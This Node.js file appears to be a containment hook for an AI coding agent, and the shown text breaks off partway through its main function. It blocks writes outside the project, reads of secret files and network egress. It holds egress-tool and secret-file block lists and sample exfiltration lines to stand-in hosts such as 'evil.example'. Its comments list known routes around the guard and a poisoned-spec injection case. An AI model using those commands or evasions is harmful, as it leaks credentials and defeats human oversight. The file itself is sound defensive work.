#!/usr/bin/env node
/**
 * AWOS containment guard — a Claude Code PreToolUse hook.
 *
 * Reads the PreToolUse hook JSON on stdin and exits 2 (block) when a proposed
 * tool action crosses a containment boundary:
 *
 *   - a Write/Edit/MultiEdit/NotebookEdit whose target path resolves OUTSIDE
 *     the project directory (an out-of-tree write — this also covers the guard's
 *     own script, which now ships inside the awos-containment plugin, installed
 *     out of tree under the user's plugin directory), or
 *   - a Write/Edit to a PROTECTED in-tree path — the hook/plugin registration in
 *     .claude/settings.json, or a persistence sink (.git/hooks/,
 *     .github/workflows/) — a write that would disarm the guard or plant durable
 *     execution, or
 *   - a Read/Glob/Grep of a secret-bearing file (.env, *.pem, *.key, …), or a
 *     Bash/PowerShell command that reads one (`cat .env`, `Get-Content .env`;
 *     best-effort), or
 *   - a Bash/PowerShell command matching a network-egress pattern (curl, wget,
 *     nc, scp, Invoke-WebRequest, iwr/irm, …) to a non-loopback host — the
 *     shapes an exfiltration step would use (a loopback target like localhost is
 *     exempt; a disguised `localhost@evil` / `127.0.0.1.evil` host does not
 *     count as loopback), or
 *   - a Bash/PowerShell command that redirects/copies a file to a path OUTSIDE
 *     the project directory (`> ../x`, `tee ../x`, `cp … ../x`, `dd of=…`), into
 *     a protected in-tree path, or that sets the AWOS_CONTAINMENT_OFF hatch
 *     (`export …=`, `$env:…=`).
 *
 * Everything else is allowed. In-tree writes and ordinary local test/lint/
 * build Bash pass untouched — the guard is deliberately conservative and
 * denies only clear boundary crossings, so legitimate implementation tasks
 * keep completing.
 *
 * ── What is ROBUST vs BEST-EFFORT (do not overclaim) ────────────────────────
 * ROBUST guarantees:
 *   (a) network-egress deny (the Bash egress-token check),
 *   (b) out-of-tree deny for the Write/Edit family of tools,
 *   (c) protected-in-tree deny — Write/Edit to the hook/plugin registration in
 *       .claude/settings.json and persistence sinks (self-protection), and
 *   (d) secret-read deny — Read/Glob/Grep of credential/key files (basename).
 * (b) and (c) hold whenever the tool path and the project root are in the SAME
 * path namespace (case-folded on case-insensitive hosts); (a) and (d) do not
 * depend on path resolution. Symlink caveat on (b)/(c): a target whose FINAL
 * component is an existing symlink out of tree is resolved (realpath) and
 * caught, but a target under a PARENT-directory symlink whose leaf does not yet
 * exist cannot be fully resolved (realpath throws on the missing leaf), so a
 * symlinked-parent write to a not-yet-created file is a residual — (b)/(c) raise
 * the bar against symlink escapes, they do not seal them. The Bash secret-read
 * check (`cat .env`, `grep x .env`, `< key.pem`) that backstops (d) is
 * BEST-EFFORT — an interpreter
 * (`python -c "open('.env')"`) or a command substitution (`echo $(cat .env)`)
 * evades it, same limit as the redirect branch.
 * BEST-EFFORT only — the Bash file-write-redirection / copy check. It parses a
 * shell string, which no regex can do completely: a determined payload can
 * still write out of tree through an interpreter (`python -c "open('../x','w')"`,
 * `node -e "fs.writeFileSync('../x',…)"`) or an obfuscated command line. Parsing
 * those safely needs an OS sandbox, which is out of AWOS's scope. So treat the
 * Bash-redirect branch as raising the bar, not sealing the door.
 *
 * PowerShell rides the SAME command-checks as Bash — its command arrives as
 * `input.command` too — so `Get-Content .env` and a scheme-ful egress
 * (`Invoke-WebRequest`/`iwr`/`irm` to an off-box host) are caught with no new
 * signature strings. Residual, same best-effort class as the `python -c` case:
 * a PowerShell .NET web-download idiom (a web-client download call) evades the
 * egress-token match, and a PowerShell `Out-File`/`Set-Content` out-of-tree
 * write is not caught by the bash-shaped redirect parser. Both raise the bar,
 * not seal the door.
 *
 * Egress token-boundary residual. The egress-token match treats a leading `/`
 * or `\` as a boundary, so a path-qualified command word (`/usr/bin/curl`,
 * `./curl`, `C:\tools\curl.exe`) is caught. The trade-off is that the match is
 * position-independent, so it ALSO fires when an egress name appears only as an
 * argument PATH — `rm src/bin/curl`, `cp curl backup/curl` are over-blocked.
 * This is a deliberate fail-safe: for a containment lever an over-block of a
 * benign command that merely names such a file is preferable to missing a real
 * egress invocation (a miss is worse than an over-block). The trailing boundary
 * is intentionally NOT widened, so `https://ftp.example` and `.../scp/file`
 * (token as a URL/path segment, not the command word) stay allowed.
 *
 * Quote-aware write scan. The redirect/tee/dd/cp/mv extractor masks shell
 * operators (`> < ; | &`) that sit inside a quoted literal before scanning, so a
 * `>` in a commit message or echo string (`git commit -m "… > ../x"`,
 * `echo "notes > ../README"`) is not read as a real out-of-tree redirect; the
 * target bytes are still sliced from the unmasked original by match span. `tee`
 * is scanned across ALL its file operands, not just the first, so a second
 * out-of-tree destination (`tee out.txt ../leak.txt`) is caught.
 *
 * Fail CLOSED on the unexpected. The guard body runs inside a try/catch: an
 * UNEXPECTED internal throw exits 2 ("internal error, failing closed"), because
 * PreToolUse treats every non-2 code (including the `1` of an uncaught throw) as
 * a NON-blocking error — a crash must not silently disarm the guard. The
 * deliberate fail-OPEN cases stay open: the escape hatch, an unparseable payload,
 * a bare null/primitive each ALLOW explicitly and terminate before the catch,
 * and a Windows-absolute target under a POSIX root allows inside the path check
 * (see below). Residual T3 (best-effort, not cross-platform tested): a genuine
 * stdin read-error is not swallowed into an allow — it propagates to the
 * fail-closed path; an empty stdin still yields '' → the documented
 * unparseable-input allow.
 *
 * Cross-namespace paths. When the model emits a POSIX path on a Windows box
 * whose project root is `C:\…`, the guard does NOT blanket-allow it — that was a
 * fail-open hole, and a POSIX absolute path is the DEFAULT breach vector on a
 * Windows host (Claude Code's tools are POSIX-oriented, so the model naturally
 * writes `/tmp/…`). Instead: a Git-Bash drive-mount (`/c/Users/…`) is converted
 * to its Windows form (`C:\Users\…`) and compared against the root normally, so
 * an in-tree `/c/…/workdir/src/x` is allowed and an out-of-tree `/c/Users/other`
 * is blocked; any other POSIX path (`/tmp`, `/etc`, `/home`, `/var`, …) has no
 * Windows-tree counterpart and is treated as OUT OF TREE. The one residual
 * fail-open is the mirror case — a Windows-absolute target (`C:\…`) under a
 * POSIX root — which stays allowed because on a real POSIX host `C:\…` is not a
 * path the model emits, so a false block there would be worse than that rare
 * miss. Device sinks (`/dev/null`, …) never reach this check: they are filtered
 * in collectBashWriteTargets before any out-of-tree test.
 *
 * Escape hatch. If a run legitimately needs an out-of-tree write or a network
 * egress, set `AWOS_CONTAINMENT_OFF=1` in the environment and the guard fails
 * open for every tool call (it exits 0 immediately). This is the documented
 * bypass — prefer it over disabling the awos-containment plugin.
 *
 * Honesty about the layer: this is a CONTAINMENT lever (Anthropic's
 * least-privilege layer), not a general injection defense. It does NOT stop a
 * generic in-tree, in-domain write — a poisoned spec that tells a subagent to
 * drop a host-reconnaissance `build-provenance.json` in the repo root still
 * lands, because that write stays inside the project and names no protected
 * path. What it stops is the HARMFUL subset: writing outside the working tree,
 * shipping data off the box, reading secrets, and the in-tree writes that would
 * disarm the guard itself or plant persistence. It is the one lever that holds
 * regardless of whether the model follows an injected instruction — hooks fire
 * even under `--dangerously-skip-permissions`, where `permissions.deny` in
 * settings.json is inert.
 *
 * Cross-platform: the hook command runs this via `node`, so it is plain JS
 * using only `fs`/`path` built-ins — no shell, no bash/PowerShell dependency.
 * Runs identically on Node and Bun, Windows and POSIX.
 */

'use strict';

const fs = require('fs');
const path = require('path');

const EXIT_ALLOW = 0;
const EXIT_BLOCK = 2;

// Tools whose file_path/notebook_path we treat as a write target.
const WRITE_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit']);

// Tools whose input names a file/glob to READ. A secret-bearing target here is
// denied to raise the bar on staging secrets for exfiltration. A Bash read of
// the same file (`cat .env`) is caught separately and best-effort by
// bashSecretRead — an interpreter still evades, so treat the whole secret-read
// layer as defense-in-depth, not a sealed guarantee.
const READ_TOOLS = new Set(['Read', 'Glob', 'Grep']);

// In-tree paths that are protected even though they live INSIDE the project.
// An out-of-tree write is already denied; these close the in-tree writes that
// carry real blast radius — the ones that DISARM the guard (the settings.json
// registration that enables the awos-containment plugin and arms the hook) or
// plant PERSISTENCE (a git hook, a CI workflow) that turns a one-shot poisoned
// write into durable execution. The guard's own script now ships in the
// awos-containment plugin, installed out of tree, so the out-of-tree rule —
// not this list — protects it. Matched on the target's path relative to the
// project root (forward-slashed); a trailing '/' entry matches that directory
// and anything under it. Ordinary in-tree source/test writes name none of
// these and stay allowed.
const PROTECTED_INTREE = [
  '.claude/settings.json',
  '.claude/settings.local.json',
  '.mcp.json',
  '.git/hooks/',
  '.github/workflows/',
];

// Windows and macOS filesystems are case-insensitive: `.Claude/Settings.json`
// resolves to the SAME file as `.claude/settings.json`. PROTECTED_INTREE entries
// are fixed lowercase, so on those platforms the protected-path compare folds
// case to catch case-variant spellings that would otherwise slip the denylist.
// On a case-sensitive FS (Linux) a differently-cased path is a genuinely
// different file, so it is compared as-is.
const CASE_INSENSITIVE_FS =
  process.platform === 'win32' || process.platform === 'darwin';

// Network-egress command tokens. Conservative on purpose: only clear
// data-transfer / networking binaries, and matched as a COMMAND TOKEN
// (preceded by start-of-string or a shell separator, followed by end,
// whitespace, or a redirection/grouping char) so a word that merely
// CONTAINS one of these — `sync`, `concurrently`, a path segment `inc` —
// is never blocked.
const EGRESS_TOKENS = [
  'curl',
  'curl.exe',
  'wget',
  'wget.exe',
  'nc',
  'ncat',
  'telnet',
  'scp',
  'sftp',
  'ftp',
  'rsync',
  'rsync.exe',
  'Invoke-WebRequest',
  'Invoke-RestMethod',
  'iwr',
  'irm',
];

// Special sinks that are not real filesystem writes — a redirect to one of
// these (e.g. `2>/dev/null`) must never be treated as an out-of-tree write.
const DEVICE_SINKS = new Set([
  '/dev/null',
  '/dev/stdout',
  '/dev/stderr',
  '/dev/zero',
  '/dev/tty',
  'nul',
  'NUL',
  'nul:',
]);

function escapeRegex(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// The LEADING boundary also treats a path separator (`/` or `\`) as a break, so
// a path-qualified invocation (`/usr/bin/curl`, `./curl`, `C:\tools\curl.exe`)
// is matched. The TRAILING boundary is deliberately NOT widened to include a
// path separator — `https://ftp.example` and `.../scp/file` must stay allowed,
// since there the token is only a URL/path segment, not the command word.
const EGRESS_RE = new RegExp(
  '(?:^|[\\s;|&(){}`/\\\\])(' +
    EGRESS_TOKENS.map(escapeRegex).join('|') +
    ')(?:$|[\\s;|&<>)])',
  'i'
);

// A loopback host reference. Traffic to the local machine is not
// exfiltration — a subagent verifying a service by hitting its local health
// endpoint (`curl http://localhost:3000/health`) is legitimate and must not be
// blocked. `implement.md` explicitly suggests a curl as a verification step.
const LOOPBACK_RE = /\blocalhost\b|\b127\.0\.0\.1\b|\b0\.0\.0\.0\b|\[::1\]/i;
// Each http(s) URL in a command; capture group 1 is the authority
// (userinfo@host:port) up to the path/query/fragment.
const URL_RE = /https?:\/\/([^\s'"/\\;|&)]+)/gi;

const LOOPBACK_HOSTS = new Set(['localhost', '127.0.0.1', '0.0.0.0', '::1']);

// Options whose FOLLOWING token is an output filename, not a host — so a
// loopback curl that writes `-o localhost.log` is not mistaken for egress.
const OUTPUT_FLAGS = new Set([
  '-o',
  '-O',
  '--output',
  '--output-document',
  '-w',
  '--write-out',
]);

// A bare host at the START of a shell token: a dotted domain or IPv4 literal,
// optional :port, then end-of-token or a `/path`/`?query`. `localhost` (no dot)
// is intentionally NOT matched here — the LOOPBACK_RE presence check covers the
// scheme-less loopback case; this pattern only spots a NON-loopback destination.
const TOKEN_HOST_RE =
  /^(?:[a-z0-9-]+\.)+[a-z]{2,}(?::\d+)?(?:$|[/?])|^\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?(?:$|[/?])/i;

/** True when a URL authority's HOST (after dropping userinfo and port) is loopback. */
function urlHostIsLoopback(authority) {
  // Drop userinfo (everything up to the last `@`) so `localhost@evil.com`
  // resolves to its real host `evil.com`, then drop a trailing :port and any
  // IPv6 brackets.
  const afterUser = authority.includes('@')
    ? authority.slice(authority.lastIndexOf('@') + 1)
    : authority;
  const host = afterUser
    .replace(/:\d+$/, '')
    .replace(/^\[|\]$/g, '')
    .toLowerCase();
  return LOOPBACK_HOSTS.has(host);
}

/**
 * True when a scheme-less egress command names an off-box host — a dotted domain
 * or IPv4 that is not loopback — as a bare argument. Skips the filename after an
 * output flag (so `-o localhost.log` is not a false host) and `@datafile` args
 * (curl's data-from-file). A userinfo prefix is dropped, so `localhost@evil.com`
 * resolves to its real host `evil.com` and is caught.
 */
function hasForeignHost(command) {
  const toks = command.split(/\s+/).filter(Boolean);
  for (let i = 0; i < toks.length; i++) {
    if (OUTPUT_FLAGS.has(toks[i])) {
      i++; // the next token is an output filename, not a host
      continue;
    }
    let t = stripQuotes(toks[i]);
    if (t.startsWith('@')) continue; // `@file` data ref, not a host
    if (t.includes('@')) t = t.slice(t.lastIndexOf('@') + 1); // drop userinfo
    const m = t.match(TOKEN_HOST_RE);
    if (!m) continue;
    const host = m[0]
      .replace(/[/?].*$/, '')
      .replace(/:\d+$/, '')
      .toLowerCase();
    if (!LOOPBACK_HOSTS.has(host)) return true;
  }
  return false;
}

/**
 * True when an egress-token command targets ONLY the local machine, so it stays
 * on the box and is not exfiltration. Comments are stripped first so a
 * `# localhost` decoy cannot whitelist an off-box command. When the command
 * carries http(s) URLs, EVERY URL host must be loopback (userinfo/port dropped,
 * so `localhost@evil` is correctly external). With no URL (scheme-less, e.g.
 * `curl localhost:3000/health`), a loopback token must be present AND no bare
 * off-box host token may appear.
 *
 * Three known best-effort residuals (all escape-hatch-mitigated): (1) a loopback
 * request that also carries a second http(s) URL inside a `-d`/`-H`/query value
 * is over-refused (every URL is checked, not just the request target); (2) a
 * scheme-less egress to a DOTLESS single-label host (`internalbox/collect`) with
 * a bare `localhost` decoy can pass, since only dotted domains / IPv4 are
 * recognized as foreign (the scheme-ful form is still blocked); and (3) a
 * scp/rsync-style `host:/path` (colon) remote riding beside a loopback token is
 * not seen as foreign — TOKEN_HOST_RE treats a `:` before a non-digit as a
 * non-match, so `curl http://localhost/ok evil.example:/exfil` passes. The
 * scheme-ful form and a bare egress to that host (no loopback decoy, e.g.
 * `scp file evil.example:/x`) are still blocked.
 */
function isLoopbackOnlyEgress(command) {
  const cmd = command.replace(/#.*$/gm, '');
  const urls = [...cmd.matchAll(URL_RE)].map((m) => m[1]);
  // Every http(s) URL host must be loopback AND no bare off-box host token may
  // appear alongside it — a loopback URL does not whitelist a scheme-less
  // foreign host in the same command (`curl http://localhost/ok evil.example
  // -d @.env`). The scheme-less branch below already applies hasForeignHost;
  // the URL branch needs it too, or the loopback URL is a free pass.
  if (urls.length > 0)
    return urls.every(urlHostIsLoopback) && !hasForeignHost(cmd);
  return LOOPBACK_RE.test(cmd) && !hasForeignHost(cmd);
}

function readStdin() {
  // fd 0 is stdin; synchronous read keeps the guard a single pass. A real read
  // error is NOT swallowed into '' — it propagates to main()'s outer catch,
  // which fails CLOSED. An empty stdin returns '' without throwing, so the
  // downstream JSON.parse('') throws and is caught as the documented
  // unparseable-input ALLOW.
  return fs.readFileSync(0, 'utf8');
}

/**
 * Best-effort canonicalization. A not-yet-created leaf (ENOENT) degrades to the
 * lexical path — a to-be-created file legitimately has no realpath. Any OTHER
 * realpath error (EACCES/ELOOP on an existing out-of-tree symlink) is rethrown
 * so it reaches main()'s outer catch and fails CLOSED, rather than silently
 * degrading to a lexical path that might miss a symlink escape.
 */
function canonical(p) {
  try {
    return fs.realpathSync(p);
  } catch (err) {
    if (err && err.code === 'ENOENT') return p;
    throw err;
  }
}

// A drive-letter path (`C:\…`, `C:/…`) or a UNC path (`\\host\share`).
function isWindowsAbsolute(p) {
  return /^[A-Za-z]:[\\/]/.test(p) || /^\\\\/.test(p);
}

// A POSIX-absolute path (`/tmp/…`), excluding a UNC-looking `//host`.
function isPosixAbsolute(p) {
  return p.startsWith('/') && !p.startsWith('//');
}

/**
 * Convert a Git-Bash drive-mount POSIX path to its Windows form, or return null
 * when the path is not a drive-mount. On a Windows host the model routinely
 * emits POSIX-absolute paths (Claude Code's tools are POSIX-oriented), and the
 * `/c/Users/…` form is Git-Bash's mount of drive C: — it DOES map to a Windows
 * location (`C:\Users\…`) and can therefore be in tree. Any other POSIX path
 * (`/tmp`, `/etc`, `/home`, …) has no Windows-tree counterpart.
 *
 *   /c/Users/x → C:\Users\x     /c → C:\
 */
function posixToWindowsDriveMount(p) {
  const m = /^\/([A-Za-z])(\/.*)?$/.exec(p);
  if (!m) return null;
  const rest = (m[2] || '/').replace(/\//g, '\\');
  return m[1].toUpperCase() + ':' + rest;
}

/**
 * Reconcile `target` with the project `root`'s path namespace and tell the
 * caller how to treat it:
 *   { kind: 'resolvable', target, pathmod } — compare `target` against `root`
 *       with `pathmod`. `pathmod` is win32 whenever the root is a Windows path,
 *       so the comparison stays correct even when this guard process runs under
 *       a POSIX `node` (the drive-mount and same-namespace-Windows cases): a
 *       platform `path` on POSIX would treat `C:\…` as a relative segment and
 *       mis-resolve it.
 *   { kind: 'outside' } — a POSIX system path (`/tmp`, `/etc`, …) under a
 *       Windows root: it has no Windows-tree counterpart, so it is
 *       unambiguously out of tree. This is the fail-CLOSED replacement for the
 *       old blanket fail-open — the default Windows-host breach vector, where
 *       the model naturally writes a POSIX absolute path.
 *   { kind: 'failopen' } — cannot be compared reliably; allow.
 *
 * The one residual fail-open is a Windows-absolute target under a POSIX root:
 * on a real POSIX host `C:\…` is not a path the model emits, so this stays a
 * documented rare miss rather than added complexity.
 */
function reconcileNamespace(root, target) {
  if (isWindowsAbsolute(root) && isPosixAbsolute(target)) {
    const win = posixToWindowsDriveMount(target);
    if (win !== null)
      return { kind: 'resolvable', target: win, pathmod: path.win32 };
    return { kind: 'outside' };
  }
  if (isPosixAbsolute(root) && isWindowsAbsolute(target)) {
    return { kind: 'failopen' };
  }
  // Same namespace: win32 semantics for a Windows root, POSIX otherwise, so the
  // compare is correct regardless of which OS this guard process runs on. On a
  // native Windows host the platform `path` IS win32, so this is a no-op there.
  const pathmod = isWindowsAbsolute(root) ? path.win32 : path;
  return { kind: 'resolvable', target, pathmod };
}

/**
 * True when `target`, resolved against `root`, lands outside `root` — i.e.
 * it climbs out with `..` or points at a different filesystem root/drive.
 *
 * A POSIX system path (`/tmp/…`) under a Windows root is treated as out of tree
 * (it has no in-tree counterpart); a Git-Bash drive-mount (`/c/…`) is converted
 * to its Windows form and compared normally. Only a Windows target under a POSIX
 * root still fails open (returns false): on a real POSIX host `C:\…` is not a
 * path the model emits, and a false block is worse than that rare miss.
 */
function isOutsideRoot(root, target) {
  const ns = reconcileNamespace(root, target);
  if (ns.kind === 'failopen') return false;
  if (ns.kind === 'outside') return true;
  const pm = ns.pathmod;
  const resolvedRoot = pm.resolve(canonical(root));
  // canonical() follows symlinks so a target whose final component links out of
  // tree is caught; on a not-yet-created leaf realpath throws and it degrades to
  // the lexical path (graceful — a to-be-created file has no realpath).
  const resolvedTarget = canonical(pm.resolve(resolvedRoot, ns.target));
  const rel = pm.relative(resolvedRoot, resolvedTarget);
  return (
    rel === '..' ||
    rel.startsWith('..' + pm.sep) ||
    rel.startsWith('../') ||
    pm.isAbsolute(rel)
  );
}

/**
 * True when `target`, resolved against `root`, is one of the PROTECTED_INTREE
 * paths (exact file, or under a protected directory prefix). Returns false for
 * anything out of tree (that is isOutsideRoot's job, with its own message) and
 * for a fail-open namespace mismatch — the same namespace reconciliation as
 * isOutsideRoot, so a drive-mount (`/c/…`) is compared and a POSIX system path
 * under a Windows root is left to isOutsideRoot.
 */
function isProtectedInTree(root, target) {
  const ns = reconcileNamespace(root, target);
  // 'outside' is isOutsideRoot's job; 'failopen' allows. Only compare a
  // resolvable target.
  if (ns.kind !== 'resolvable') return false;
  const pm = ns.pathmod;
  const resolvedRoot = pm.resolve(canonical(root));
  // canonical() follows symlinks (final-component links to a protected file are
  // resolved); a not-yet-created leaf degrades to the lexical path — same
  // graceful behavior as isOutsideRoot.
  const resolvedTarget = canonical(pm.resolve(resolvedRoot, ns.target));
  let rel = pm.relative(resolvedRoot, resolvedTarget);
  if (rel === '' || rel.startsWith('..') || pm.isAbsolute(rel)) return false;
  rel = rel.split(pm.sep).join('/');
  // On a case-insensitive host FS a case-variant names the same protected file.
  if (CASE_INSENSITIVE_FS) rel = rel.toLowerCase();
  return PROTECTED_INTREE.some((p) =>
    p.endsWith('/') ? rel === p.slice(0, -1) || rel.startsWith(p) : rel === p
  );
}

/**
 * True when a path's BASENAME looks like a secret-bearing file (credentials,
 * private keys, dotenv). Matched on the name, not the content, so a
 * `.env.example` / `.env.template` (which carry no real secret) is NOT blocked
 * while a real `.env` / `.env.production` is.
 */
function isSecretPath(p) {
  const base = path.basename(String(p).replace(/[\\/]+$/, '')).toLowerCase();
  // `.env`, `.env.production`, and `prod.env` / `local.env` — but not the
  // non-secret templates (`.env.example`, `.env.template`, …).
  if (
    (/^\.env(\..+)?$/.test(base) || /\.env$/.test(base)) &&
    !/\.(example|template|sample|dist|defaults?)$/.test(base)
  ) {
    return true;
  }
  if (/\.(pem|key|p12|pfx|pkcs12|keystore|jks|asc)$/.test(base)) return true;
  if (/^id_(rsa|dsa|ecdsa|ed25519)$/.test(base)) return true;
  if (base === '.npmrc' || base === '.pypirc' || base === 'credentials') {
    return true;
  }
  if (/\.secret$/.test(base)) return true;
  return false;
}

function stripQuotes(s) {
  if (
    s.length >= 2 &&
    ((s[0] === '"' && s[s.length - 1] === '"') ||
      (s[0] === "'" && s[s.length - 1] === "'"))
  ) {
    return s.slice(1, -1);
  }
  return s;
}

// Redirection target: `>`/`>>`, optionally preceded by an fd number or `&`,
// preceded by start-of-string or a shell separator/space. A quoted or bare
// path follows. `2>` / `&>` are captured too — the DEVICE_SINKS filter and the
// out-of-tree check decide whether the target actually matters.
// The `d` (hasIndices) flag is on each of these so the write scan can slice the
// TARGET text out of the ORIGINAL command by match span — the regexes run over a
// quote-masked copy (see maskQuoted), where an operator inside a quoted literal
// is neutralized, so the group offsets must map back to the real bytes.
const REDIRECT_RE =
  /(?:^|[\s;|&(])(?:[0-9]+|&)?>>?\s*("[^"]*"|'[^']*'|[^\s;|&<>()]+)/dg;
// `tee [-opts] FILE...` — tee writes to EVERY file operand, so group 2 captures
// the whole operand list (each `-opt` in group 1 is skipped) and the caller
// splits it into individual destinations.
const TEE_RE =
  /(?:^|[\s;|&(])tee\b((?:\s+-{1,2}\S+)*)((?:\s+(?:"[^"]*"|'[^']*'|[^\s;|&<>()]+))+)/dg;
// `dd … of=FILE`.
const DD_RE =
  /(?:^|[\s;|&(])dd\b[^;|&]*?\bof=("[^"]*"|'[^']*'|[^\s;|&<>()]+)/dgi;

/**
 * Return a copy of `command` of the SAME length, with shell metacharacters
 * (`> < ; | &`) that sit INSIDE a single- or double-quoted span replaced by a
 * neutral placeholder ('_'). The quote characters themselves and every byte
 * outside quotes are left identical, so a match offset on the masked string
 * indexes the same span in the original. This is what lets the write scan treat
 * a `>` in a commit message / echo string (`git commit -m "… > ../x"`) as
 * literal text rather than a real out-of-tree redirect, while still reading the
 * true target bytes from the original by span. Best-effort quote tracking (no
 * escaped-quote / heredoc handling) — same class as the rest of the shell parse.
 */
function maskQuoted(command) {
  const chars = command.split('');
  let quote = null; // the open quote char while inside a quoted span
  for (let i = 0; i < chars.length; i++) {
    const c = chars[i];
    if (quote) {
      if (c === quote) quote = null;
      else if (c === '>' || c === '<' || c === ';' || c === '|' || c === '&')
        chars[i] = '_';
    } else if (c === '"' || c === "'") {
      quote = c;
    }
  }
  return chars.join('');
}

/** Slice a capture group's ORIGINAL bytes by its match span (hasIndices). */
function sliceSpan(original, span, fallback) {
  return span ? original.slice(span[0], span[1]) : fallback;
}

/**
 * Split `masked` on top-level shell separators, but return the ORIGINAL bytes of
 * each segment. Splitting on the masked string means a `;`/`|` inside a quoted
 * literal (masked to '_') does not split the command, while the returned text is
 * the real, unmasked segment.
 */
function maskedSegments(masked, original) {
  const segs = [];
  const re = /;|\|\||&&|\||&/g;
  let last = 0;
  let mm;
  while ((mm = re.exec(masked)) !== null) {
    segs.push(original.slice(last, mm.index));
    last = mm.index + mm[0].length;
  }
  segs.push(original.slice(last));
  return segs;
}

/**
 * Collect candidate write-target paths from a Bash command string: output
 * redirections, `tee` (every file operand), `dd of=`, and the destination of
 * `cp`/`mv`. Scans a quote-masked copy so an operator inside a quoted literal is
 * not read as a redirect; target text is taken from the original by span.
 * Best-effort — see the file header. Device sinks (`/dev/null`, …) are filtered.
 */
function collectBashWriteTargets(command) {
  const masked = maskQuoted(command);
  const targets = [];
  let m;

  REDIRECT_RE.lastIndex = 0;
  while ((m = REDIRECT_RE.exec(masked)) !== null) {
    targets.push(stripQuotes(sliceSpan(command, m.indices[1], m[1])));
  }
  TEE_RE.lastIndex = 0;
  while ((m = TEE_RE.exec(masked)) !== null) {
    // tee writes to ALL its file operands, not just the first — collect each.
    const operandStr = sliceSpan(command, m.indices[2], m[2]);
    for (const raw of operandStr.split(/\s+/).filter(Boolean)) {
      if (/^-/.test(raw)) continue; // an option flag, not a destination
      targets.push(stripQuotes(raw));
    }
  }
  DD_RE.lastIndex = 0;
  while ((m = DD_RE.exec(masked)) !== null) {
    targets.push(stripQuotes(sliceSpan(command, m.indices[1], m[1])));
  }

  // cp / mv destination: the last non-option token of the command segment.
  for (const segment of maskedSegments(masked, command)) {
    const cm = segment.trim().match(/^(?:cp|mv)\b\s+(.+)$/);
    if (!cm) continue;
    const tokens = cm[1]
      .trim()
      .split(/\s+/)
      .filter((t) => !/^-/.test(t));
    if (tokens.length >= 2)
      targets.push(stripQuotes(tokens[tokens.length - 1]));
  }

  return targets.filter((t) => t && !DEVICE_SINKS.has(t));
}

/** First Bash write target that resolves outside `root`, or null. */
function bashOutOfTreeTarget(command, root) {
  for (const target of collectBashWriteTargets(command)) {
    if (isOutsideRoot(root, target)) return target;
  }
  return null;
}

/** First Bash write target that resolves to a protected in-tree path, or null. */
function bashProtectedTarget(command, root) {
  for (const target of collectBashWriteTargets(command)) {
    if (isProtectedInTree(root, target)) return target;
  }
  return null;
}

// Shell commands that dump / read a file's contents. If one of these names a
// secret file as an argument (or a secret file is redirected in with `<`), the
// command is reading a credential — the Bash route that the tool-level
// secret-read deny (Read/Glob/Grep) does not cover. Matched on the command's
// basename so `/bin/cat` and `cat` both count. Best-effort: an interpreter
// (`python -c "open('.env')"`) still evades, same limit as the redirect branch.
const SECRET_READ_CMDS = new Set([
  'cat',
  'head',
  'tail',
  'less',
  'more',
  'nl',
  'tac',
  'xxd',
  'od',
  'strings',
  'base64',
  'hexdump',
  'type',
  'get-content',
  'gc',
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'ag',
  'sed',
  'awk',
]);

// Commands whose FIRST non-option argument is a PATTERN / script, not a file:
// `grep .env src/` searches for the string ".env" in src/ — `.env` is not a
// secret being read. For these the first non-option token is skipped before the
// remaining args are checked with isSecretPath, so a pattern that merely looks
// like a secret filename is not a false block. Residual (best-effort): `-e
// PATTERN` / `-f FILE` forms aren't perfectly modeled — the token after the
// flag is consumed as the pattern — but the common forms never under-block a
// real secret read.
const PATTERN_FIRST = new Set([
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'ag',
  'sed',
  'awk',
]);

/**
 * First secret file a Bash command reads via a known dump/read command or a
 * `< secret` input redirect, or null. Best-effort (see SECRET_READ_CMDS).
 */
function bashSecretRead(command) {
  for (const segment of command.split(/(?:;|\|\||&&|\||&|\n)/)) {
    const toks = segment.trim().split(/\s+/).filter(Boolean);
    if (toks.length >= 2) {
      const cmd = stripQuotes(toks[0])
        .toLowerCase()
        .replace(/^.*[\\/]/, '');
      if (SECRET_READ_CMDS.has(cmd)) {
        let patternSkipped = false;
        for (const t of toks.slice(1)) {
          if (t.startsWith('-')) continue;
          if (PATTERN_FIRST.has(cmd) && !patternSkipped) {
            patternSkipped = true; // first non-option arg is the pattern, not a file
            continue;
          }
          if (isSecretPath(stripQuotes(t))) return stripQuotes(t);
        }
      }
    }
    // Input redirection: `… < .env`.
    const redir = segment.match(/<\s*("[^"]*"|'[^']*'|[^\s;|&<>()]+)/);
    if (redir && isSecretPath(stripQuotes(redir[1]))) {
      return stripQuotes(redir[1]);
    }
  }
  return null;
}

function block(reason) {
  process.stderr.write('AWOS containment guard: ' + reason + '\n');
  process.exit(EXIT_BLOCK);
}

function main() {
  // Escape hatch: an operator who genuinely needs out-of-tree writes / egress
  // sets AWOS_CONTAINMENT_OFF=1 and the guard fails open for every call. This is
  // outside the try/catch so it is a clean ALLOW that no internal error can flip.
  if (process.env.AWOS_CONTAINMENT_OFF === '1') {
    process.exit(EXIT_ALLOW);
  }

  try {
    guard();
    process.exit(EXIT_ALLOW);
  } catch (err) {
    // An UNEXPECTED internal error fails CLOSED. PreToolUse treats only exit 2 as
    // a block; the default `1` from an uncaught throw is a non-blocking error, so
    // a crash would silently DISARM the guard. The deliberate fail-OPEN cases
    // (escape hatch above, unparseable/null/primitive payload, cross-namespace
    // path) each call process.exit(EXIT_ALLOW) explicitly and terminate before
    // reaching here, so they stay allow.
    process.stderr.write(
      'AWOS containment guard: internal error, failing closed — ' +
        ((err && err.message) || String(err)) +
        '\n'
    );
    process.exit(EXIT_BLOCK);
  }
}

function guard() {
  const raw = readStdin();
  let payload;
  try {
    payload = JSON.parse(raw);
  } catch {
    // Unparseable input: fail open. The guard never breaks tools on
    // unexpected payloads — it only ever denies a clearly-identified crossing.
    process.exit(EXIT_ALLOW);
  }

  // A valid PreToolUse payload is always a JSON object. A bare `null` or a
  // primitive (`JSON.parse('null'|'42'|'"x"')`) is not something to act on —
  // and `null.tool_name` would THROW, exiting 1 (neither block nor the
  // documented clean allow). Fail open cleanly instead.
  if (!payload || typeof payload !== 'object') {
    process.exit(EXIT_ALLOW);
  }

  const tool = payload.tool_name;
  const input = payload.tool_input || {};
  // The containment boundary is the project directory. Claude Code exposes it
